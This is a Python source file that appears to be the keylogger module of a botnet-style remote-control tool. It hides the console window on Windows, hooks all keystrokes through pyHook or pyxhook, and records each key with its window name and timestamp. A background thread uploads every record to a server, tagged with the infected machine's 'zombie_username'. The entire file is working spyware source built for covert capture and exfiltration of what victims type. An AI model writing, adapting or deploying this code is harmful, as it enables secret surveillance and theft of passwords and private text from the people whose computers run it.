#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import platform, queue, threading

class Keylogger:
    def __init__(self):
        self.keys_pressed = queue.Queue()
        pass

    def keep_uploading_info(self):
        from app.components import config, logger
        from app.modules import crud
        while True:
            new_row = self.keys_pressed.get()
            logger.log('posting key pressed: {}'.format(new_row, 'INFO'))
            if crud.create_data('keylog', {"zombie_username": config.credentials["username"],
                                           "keylog": new_row}):
                self.keys_pressed.task_done()
            else:
                self.keys_pressed.put(new_row)

    def keep_running(self):
        from app.components import logger

        # keylogger to be used in windows
        if platform.system() == "Windows":
            import win32api
            import win32console
            import win32gui
            import pythoncom, pyHook

            win = win32console.GetConsoleWindow()
            win32gui.ShowWindow(win, 0)
            def OnKeyboardEvent(event):
                window_name = event.WindowName
                key_pressed = event.Key
                timestamp = event.Time
                self.keys_pressed.put({"timestamp": timestamp, "key_pressed": key_pressed, "window_name": window_name})
                logger.log("key pressed: {} in {} at {}".format(key_pressed, window_name, timestamp), 'INFO')
                # if event.Ascii == 5:
                #     _exit(1)
                # if event.Ascii != 0 or 8:
                    # if event.Ascii == 13:
                    #     key_pressed = '/n'
                    # else:
                    #     key_pressed = chr(event.Ascii)

            # create a hook manager object
            hm = pyHook.HookManager()
            hm.KeyDown = OnKeyboardEvent
            # set the hook
            hm.HookKeyboard()
            # wait forever
            pythoncom.PumpMessages()

        # keylogger to be used in linux and ios
        else:
            import pyxhook

            def OnKeyPress(event):
                window_name = event.WindowName
                key_pressed = event.Key
                timestamp = event.Time
                self.keys_pressed.put({"timestamp": timestamp, "key_pressed": key_pressed, "window_name": window_name})
                logger.log("key pressed: {} in {} at {}".format(key_pressed, window_name, timestamp), 'INFO')

            # create a hook manager object
            new_hook = pyxhook.HookManager()
            new_hook.KeyDown = OnKeyPress
            # set the hook
            new_hook.HookKeyboard()
            try:
                new_hook.start()  # start the hook
            except Exception as ex:
                logger.log('Error while catching events:\n {}'.format(ex), 'ERROR')
                #error_msg = 'Error while catching events:\n {}'.format(ex)
                #pyxhook.print_err(error_msg)
            # except KeyboardInterrupt:
            #     # User cancelled from command line.
            #     pass


    def start(self):

        threads = []

        thread_keep_uploading_info = threading.Thread(name='keep_uploading_info', target=self.keep_uploading_info)
        threads.append(thread_keep_uploading_info)

        thread_keep_running = threading.Thread(name='keep_running', target=self.keep_running)
        threads.append(thread_keep_running)

        # Start all threads
        for t in threads:
            # t.setDaemon(True)
            t.start()

        # Wait for all of them to finish
        for t in threads:
            t.join()